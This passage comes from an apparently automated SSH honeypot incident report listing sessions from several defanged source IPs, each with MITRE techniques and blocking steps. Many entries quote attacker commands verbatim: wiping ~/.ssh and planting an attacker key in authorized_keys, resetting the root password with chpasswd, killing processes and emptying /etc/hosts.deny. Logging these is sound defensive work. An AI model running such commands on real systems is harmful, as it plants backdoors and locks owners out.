| `2026-06-02 22:09:30` | `cowrie.client.kex` |
| `2026-06-02 22:09:31` | `cowrie.login.success` |
| `2026-06-02 22:09:31` | `cowrie.session.params` |
| `2026-06-02 22:09:31` | `cowrie.command.input` |
| `2026-06-02 22:09:31` | `cowrie.command.failed` |
| `2026-06-02 22:09:31` | `cowrie.log.closed` |
| `2026-06-02 22:09:32` | `cowrie.session.params` |
| `2026-06-02 22:09:32` | `cowrie.command.input` |
| `2026-06-02 22:09:32` | `cowrie.session.file_download` |
| `2026-06-02 22:09:32` | `cowrie.log.closed` |
| `2026-06-02 22:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.68.98[.]152` to AbuseIPDB if not already reported
- [ ] Block `111.68.98[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10b4cabae9e0

| Field | Detail |
|---|---|
| **Source IP** | `111.68.98[.]152` |
| **First Seen** | 2026-06-02 22:09 |
| **Last Seen** | 2026-06-02 22:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:09:34` | `cowrie.session.connect` |
| `2026-06-02 22:09:34` | `cowrie.client.version` |
| `2026-06-02 22:09:34` | `cowrie.client.kex` |
| `2026-06-02 22:09:35` | `cowrie.login.success` |
| `2026-06-02 22:09:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.68.98[.]152` to AbuseIPDB if not already reported
- [ ] Block `111.68.98[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f8514f762d0

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:27 |
| **Last Seen** | 2026-06-02 22:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:27:35` | `cowrie.session.connect` |
| `2026-06-02 22:27:35` | `cowrie.client.version` |
| `2026-06-02 22:27:35` | `cowrie.client.kex` |
| `2026-06-02 22:27:35` | `cowrie.login.success` |
| `2026-06-02 22:27:36` | `cowrie.session.params` |
| `2026-06-02 22:27:36` | `cowrie.command.input` |
| `2026-06-02 22:27:36` | `cowrie.command.failed` |
| `2026-06-02 22:27:36` | `cowrie.log.closed` |
| `2026-06-02 22:27:36` | `cowrie.session.params` |
| `2026-06-02 22:27:36` | `cowrie.command.input` |
| `2026-06-02 22:27:36` | `cowrie.session.file_download` |
| `2026-06-02 22:27:36` | `cowrie.log.closed` |
| `2026-06-02 22:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e08ec8d36ba0

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:27 |
| **Last Seen** | 2026-06-02 22:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:27:38` | `cowrie.session.connect` |
| `2026-06-02 22:27:38` | `cowrie.client.version` |
| `2026-06-02 22:27:38` | `cowrie.client.kex` |
| `2026-06-02 22:27:39` | `cowrie.login.success` |
| `2026-06-02 22:27:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e44b58daae3e

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 22:28 |
| **Last Seen** | 2026-06-02 22:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:28:40` | `cowrie.session.connect` |
| `2026-06-02 22:28:40` | `cowrie.client.version` |
| `2026-06-02 22:28:40` | `cowrie.client.kex` |
| `2026-06-02 22:28:40` | `cowrie.login.success` |
| `2026-06-02 22:28:40` | `cowrie.session.params` |
| `2026-06-02 22:28:40` | `cowrie.command.input` |
| `2026-06-02 22:28:40` | `cowrie.command.failed` |
| `2026-06-02 22:28:40` | `cowrie.log.closed` |
| `2026-06-02 22:28:41` | `cowrie.session.params` |
| `2026-06-02 22:28:41` | `cowrie.command.input` |
| `2026-06-02 22:28:41` | `cowrie.session.file_download` |
| `2026-06-02 22:28:41` | `cowrie.log.closed` |
| `2026-06-02 22:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-affffdd5d7d2

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 22:28 |
| **Last Seen** | 2026-06-02 22:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:28:43` | `cowrie.session.connect` |
| `2026-06-02 22:28:43` | `cowrie.client.version` |
| `2026-06-02 22:28:43` | `cowrie.client.kex` |
| `2026-06-02 22:28:43` | `cowrie.login.success` |
| `2026-06-02 22:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25eeb5f7cf64

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:30 |
| **Last Seen** | 2026-06-02 22:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:30:50` | `cowrie.session.connect` |
| `2026-06-02 22:30:50` | `cowrie.client.version` |
| `2026-06-02 22:30:50` | `cowrie.client.kex` |
| `2026-06-02 22:30:51` | `cowrie.login.success` |
| `2026-06-02 22:30:51` | `cowrie.session.params` |
| `2026-06-02 22:30:51` | `cowrie.command.input` |
| `2026-06-02 22:30:51` | `cowrie.command.failed` |
| `2026-06-02 22:30:51` | `cowrie.log.closed` |
| `2026-06-02 22:30:52` | `cowrie.session.params` |
| `2026-06-02 22:30:52` | `cowrie.command.input` |
| `2026-06-02 22:30:52` | `cowrie.session.file_download` |
| `2026-06-02 22:30:52` | `cowrie.log.closed` |
| `2026-06-02 22:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1885b1d63ed4

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:30 |
| **Last Seen** | 2026-06-02 22:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:30:54` | `cowrie.session.connect` |
| `2026-06-02 22:30:54` | `cowrie.client.version` |
| `2026-06-02 22:30:54` | `cowrie.client.kex` |
| `2026-06-02 22:30:54` | `cowrie.login.success` |
| `2026-06-02 22:30:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07bd9ccbbcb7

| Field | Detail |
|---|---|
| **Source IP** | `143.64.168[.]136` |
| **First Seen** | 2026-06-02 22:31 |
| **Last Seen** | 2026-06-02 22:31 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:6XXInunXtXmH"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:31:05` | `cowrie.session.connect` |
| `2026-06-02 22:31:05` | `cowrie.client.version` |
| `2026-06-02 22:31:06` | `cowrie.client.kex` |
| `2026-06-02 22:31:06` | `cowrie.login.success` |
| `2026-06-02 22:31:06` | `cowrie.session.params` |
| `2026-06-02 22:31:06` | `cowrie.command.input` |
| `2026-06-02 22:31:06` | `cowrie.command.failed` |
| `2026-06-02 22:31:07` | `cowrie.log.closed` |
| `2026-06-02 22:31:07` | `cowrie.session.params` |
| `2026-06-02 22:31:07` | `cowrie.command.input` |
| `2026-06-02 22:31:07` | `cowrie.session.file_download` |
| `2026-06-02 22:31:07` | `cowrie.log.closed` |
| `2026-06-02 22:31:21` | `cowrie.session.params` |
| `2026-06-02 22:31:21` | `cowrie.command.input` |
| `2026-06-02 22:31:21` | `cowrie.log.closed` |
| `2026-06-02 22:31:21` | `cowrie.session.params` |
| `2026-06-02 22:31:21` | `cowrie.command.input` |
| `2026-06-02 22:31:21` | `cowrie.log.closed` |
| `2026-06-02 22:31:22` | `cowrie.session.params` |
| `2026-06-02 22:31:22` | `cowrie.command.input` |
| `2026-06-02 22:31:22` | `cowrie.session.file_download` |
| `2026-06-02 22:31:22` | `cowrie.log.closed` |
| `2026-06-02 22:31:22` | `cowrie.session.params` |
| `2026-06-02 22:31:22` | `cowrie.command.input` |
| `2026-06-02 22:31:22` | `cowrie.log.closed` |
| `2026-06-02 22:31:23` | `cowrie.session.params` |
| `2026-06-02 22:31:23` | `cowrie.command.input` |
| `2026-06-02 22:31:23` | `cowrie.log.closed` |
| `2026-06-02 22:31:23` | `cowrie.session.params` |
| `2026-06-02 22:31:23` | `cowrie.command.input` |
| `2026-06-02 22:31:23` | `cowrie.command.input` |
| `2026-06-02 22:31:23` | `cowrie.log.closed` |
| `2026-06-02 22:31:23` | `cowrie.session.params` |
| `2026-06-02 22:31:23` | `cowrie.command.input` |
| `2026-06-02 22:31:24` | `cowrie.log.closed` |
| `2026-06-02 22:31:24` | `cowrie.session.params` |
| `2026-06-02 22:31:24` | `cowrie.command.input` |
| `2026-06-02 22:31:24` | `cowrie.log.closed` |
| `2026-06-02 22:31:25` | `cowrie.session.params` |
| `2026-06-02 22:31:25` | `cowrie.command.input` |
| `2026-06-02 22:31:25` | `cowrie.log.closed` |
| `2026-06-02 22:31:25` | `cowrie.session.params` |
| `2026-06-02 22:31:25` | `cowrie.command.input` |
| `2026-06-02 22:31:25` | `cowrie.log.closed` |
| `2026-06-02 22:31:26` | `cowrie.session.params` |
| `2026-06-02 22:31:26` | `cowrie.command.input` |
| `2026-06-02 22:31:26` | `cowrie.log.closed` |
| `2026-06-02 22:31:26` | `cowrie.session.params` |
| `2026-06-02 22:31:26` | `cowrie.command.input` |
| `2026-06-02 22:31:26` | `cowrie.log.closed` |
| `2026-06-02 22:31:27` | `cowrie.session.params` |
| `2026-06-02 22:31:27` | `cowrie.command.input` |
| `2026-06-02 22:31:27` | `cowrie.log.closed` |
| `2026-06-02 22:31:27` | `cowrie.session.params` |
| `2026-06-02 22:31:27` | `cowrie.command.input` |
| `2026-06-02 22:31:27` | `cowrie.log.closed` |
| `2026-06-02 22:31:27` | `cowrie.session.params` |
| `2026-06-02 22:31:27` | `cowrie.command.input` |
| `2026-06-02 22:31:28` | `cowrie.log.closed` |
| `2026-06-02 22:31:28` | `cowrie.session.params` |
| `2026-06-02 22:31:28` | `cowrie.command.input` |
| `2026-06-02 22:31:28` | `cowrie.log.closed` |
| `2026-06-02 22:31:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `143.64.168[.]136` to AbuseIPDB if not already reported
- [ ] Block `143.64.168[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-285fce7b0d7d

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:35 |
| **Last Seen** | 2026-06-02 22:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:35:39` | `cowrie.session.connect` |
| `2026-06-02 22:35:39` | `cowrie.client.version` |
| `2026-06-02 22:35:39` | `cowrie.client.kex` |
| `2026-06-02 22:35:40` | `cowrie.login.success` |
| `2026-06-02 22:35:40` | `cowrie.session.params` |
| `2026-06-02 22:35:40` | `cowrie.command.input` |
| `2026-06-02 22:35:40` | `cowrie.command.failed` |
| `2026-06-02 22:35:40` | `cowrie.log.closed` |
| `2026-06-02 22:35:40` | `cowrie.session.params` |
| `2026-06-02 22:35:40` | `cowrie.command.input` |
| `2026-06-02 22:35:40` | `cowrie.session.file_download` |
| `2026-06-02 22:35:40` | `cowrie.log.closed` |
| `2026-06-02 22:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b9fa5b309b2

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 22:35 |
| **Last Seen** | 2026-06-02 22:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:35:43` | `cowrie.session.connect` |
| `2026-06-02 22:35:43` | `cowrie.client.version` |
| `2026-06-02 22:35:43` | `cowrie.client.kex` |
| `2026-06-02 22:35:43` | `cowrie.login.success` |
| `2026-06-02 22:35:43` | `cowrie.session.params` |
| `2026-06-02 22:35:43` | `cowrie.command.input` |
| `2026-06-02 22:35:43` | `cowrie.command.failed` |
| `2026-06-02 22:35:43` | `cowrie.log.closed` |
| `2026-06-02 22:35:43` | `cowrie.session.params` |
| `2026-06-02 22:35:43` | `cowrie.command.input` |
| `2026-06-02 22:35:43` | `cowrie.session.file_download` |
| `2026-06-02 22:35:43` | `cowrie.log.closed` |
| `2026-06-02 22:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85bcaffe6553

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:35 |
| **Last Seen** | 2026-06-02 22:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:35:43` | `cowrie.session.connect` |
| `2026-06-02 22:35:43` | `cowrie.client.version` |
| `2026-06-02 22:35:43` | `cowrie.client.kex` |
| `2026-06-02 22:35:43` | `cowrie.login.success` |
| `2026-06-02 22:35:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85e0c30f00a7

| Field | Detail |
|---|---|
| **Source IP** | `86.98.113[.]226` |
| **First Seen** | 2026-06-02 22:35 |
| **Last Seen** | 2026-06-02 22:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:35:45` | `cowrie.session.connect` |
| `2026-06-02 22:35:45` | `cowrie.client.version` |
| `2026-06-02 22:35:45` | `cowrie.client.kex` |
| `2026-06-02 22:35:46` | `cowrie.login.success` |
| `2026-06-02 22:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `86.98.113[.]226` to AbuseIPDB if not already reported
- [ ] Block `86.98.113[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-478242e92ae2

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:37 |
| **Last Seen** | 2026-06-02 22:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:37:11` | `cowrie.session.connect` |
| `2026-06-02 22:37:11` | `cowrie.client.version` |
| `2026-06-02 22:37:11` | `cowrie.client.kex` |
| `2026-06-02 22:37:11` | `cowrie.login.success` |
| `2026-06-02 22:37:12` | `cowrie.session.params` |
| `2026-06-02 22:37:12` | `cowrie.command.input` |
| `2026-06-02 22:37:12` | `cowrie.command.failed` |
| `2026-06-02 22:37:12` | `cowrie.log.closed` |
| `2026-06-02 22:37:12` | `cowrie.session.params` |
| `2026-06-02 22:37:12` | `cowrie.command.input` |
| `2026-06-02 22:37:12` | `cowrie.session.file_download` |
| `2026-06-02 22:37:12` | `cowrie.log.closed` |
| `2026-06-02 22:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34820daeef75

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:37 |
| **Last Seen** | 2026-06-02 22:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-02 22:37:14` | `cowrie.session.connect` |
| `2026-06-02 22:37:14` | `cowrie.client.version` |
| `2026-06-02 22:37:14` | `cowrie.client.kex` |
| `2026-06-02 22:37:15` | `cowrie.login.success` |
| `2026-06-02 22:37:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `87.106.29[.]151` to AbuseIPDB if not already reported
- [ ] Block `87.106.29[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bd8d748e175

| Field | Detail |
|---|---|
| **Source IP** | `87.106.29[.]151` |
| **First Seen** | 2026-06-02 22:40 |
| **Last Seen** | 2026-06-02 22:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
